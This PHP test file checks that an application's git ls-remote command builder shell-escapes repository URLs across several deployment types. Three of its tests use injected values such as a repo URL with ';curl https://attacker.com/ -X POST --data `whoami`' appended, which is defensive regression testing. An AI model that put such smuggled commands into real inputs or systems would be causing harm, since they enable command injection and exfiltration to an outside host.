<?php

use App\Models\Application;
use App\Models\GithubApp;
use App\Models\PrivateKey;
use Illuminate\Support\Collection;

afterEach(function () {
    Mockery::close();
});

/**
 * Deploy key commands are a list of command entries (so key material can skip logging);
 * other deployment types return one shell string.
 *
 * @param  array{commands: Collection|array|string}  $result
 */
function gitSecurityLsRemoteCommandString(array $result): string
{
    if (is_string($result['commands'])) {
        return $result['commands'];
    }

    return collect($result['commands'])
        ->map(fn ($command) => is_array($command) ? $command['command'] : $command)
        ->implode(' && ');
}

it('escapes malicious repository URLs in deploy_key type', function () {
    // Arrange: Create a malicious repository URL
    $maliciousRepo = 'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`';
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('deploy_key');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Mock private key
    $privateKey = Mockery::mock(PrivateKey::class)->makePartial();
    $privateKey->shouldReceive('getAttribute')->with('private_key')->andReturn('fake-private-key');
    $application->shouldReceive('getAttribute')->with('private_key')->andReturn($privateKey);

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = gitSecurityLsRemoteCommandString($result);

    // The malicious payload should be escaped and not executed
    expect($command)->toContain("'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'");

    // Inside the docker `bash -c '...'` wrapper, the URL stays one single-quoted argument,
    // so the semicolon and backticks are never evaluated by either shell
    expect($command)
        ->toContain("git ls-remote '\\''git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'\\''")
        ->not->toContain('ls-remote git@github.com');
});

it('escapes malicious repository URLs in source type with public repo', function () {
    // Arrange: Create a malicious repository name
    $maliciousRepo = "user/repo';curl https://attacker.com/";
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('source');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Mock GithubApp source
    $source = Mockery::mock(GithubApp::class)->makePartial();
    $source->shouldReceive('getAttribute')->with('html_url')->andReturn('https://github.com');
    $source->shouldReceive('getAttribute')->with('is_public')->andReturn(true);
    $source->shouldReceive('getMorphClass')->andReturn('App\Models\GithubApp');

    $application->shouldReceive('getAttribute')->with('source')->andReturn($source);
    $application->source = $source;

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = gitSecurityLsRemoteCommandString($result);

    // The command should contain the escaped URL (escapeshellarg wraps in single quotes)
    expect($command)->toContain("'https://github.com/user/repo'\\''");
});

it('escapes repository URLs in other deployment type', function () {
    // Arrange: Create a malicious repository URL
    $maliciousRepo = "https://github.com/user/repo.git';curl https://attacker.com/";
    $deploymentUuid = 'test-deployment-uuid';

    // Mock the application
    $application = Mockery::mock(Application::class)->makePartial();
    $application->git_branch = 'main';
    $application->shouldReceive('deploymentType')->andReturn('other');
    $application->shouldReceive('customRepository')->andReturn([
        'repository' => $maliciousRepo,
        'port' => 22,
    ]);

    // Act: Generate git ls-remote commands
    $result = $application->generateGitLsRemoteCommands($deploymentUuid, true);

    // Assert: The command should contain escaped repository URL
    expect($result)->toHaveKey('commands');
    $command = gitSecurityLsRemoteCommandString($result);

    // The malicious payload should be escaped (escapeshellarg wraps and escapes quotes)
    expect($command)->toContain("'https://github.com/user/repo.git'\\''");
});

it('preserves ssh scheme URLs with custom ports in deploy_key commands', function () {
    $deploymentUuid = 'test-deployment-uuid';

    $application = new Application;
    $application->git_branch = 'master';
    $application->git_repository = 'ssh://git@192.168.56.11:22222/User/Repo.git';
    $application->private_key_id = 1;

    $privateKey = Mockery::mock(PrivateKey::class)->makePartial();
    $privateKey->shouldReceive('getAttribute')->with('private_key')->andReturn('fake-private-key');
    $application->setRelation('private_key', $privateKey);
    $application->setRelation('source', null);

    $result = $application->generateGitLsRemoteCommands($deploymentUuid, false);

    expect(gitSecurityLsRemoteCommandString($result))
        ->toContain("'ssh://git@192.168.56.11:22222/User/Repo.git'")
        ->toContain('-p 22222')
        ->not->toContain('ssh:/git@192.168.56.11:22222/User/Repo.git');
});
